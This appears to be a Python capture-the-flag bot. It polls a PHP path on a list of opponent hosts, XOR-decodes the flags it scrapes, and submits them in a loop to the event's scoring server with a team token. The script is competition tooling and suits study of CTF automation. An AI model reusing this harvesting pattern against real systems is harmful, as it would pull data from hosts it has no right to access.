from pwn import *
import requests

context.log_level = "critical"

host = "submit.alcapwnctf.in"
port = 31337

token = open("info.txt").read()
url_file = open("url.txt").readlines()

urls = []

for i in range(len(url_file)):
    urls.append("https://" + url_file[i].strip("\r\n") + "/home/talking/xero.php")


def xor_(flag):
    flag= str(flag)
    key = [1,2,3,4,5,6,7,8,9,0]
    f = ""
    k = 0
    for i in flag:
        f += chr(ord(i) ^ key[k])
        if k < len(key)-1:
            k+=1

    return f



def get_flag(url):

    r = requests.get(url)
    if r.status_code == 404:
        return None
    data = r.text[5:-6].encode('utf-8').split("\n")
    for i in range(len(data)):
        d = data[i]
        try:
            data[i] = "".join(d.split(":")[1:])
        except:
            data.remove(d)
    return data


while True:

    for url in urls:
        print url
        flags = get_flag(url)

        if flags == None:
            continue

        for i in flags:
            i = xor_(i)
            p = remote(host, port)
            p.recvline()
            p.sendline(token)
            p.recvline()
            p.sendline(i)
            response = p.recvline().strip()
            
            if "accepted" in response:
                print "[+] "+ response
            p.close()
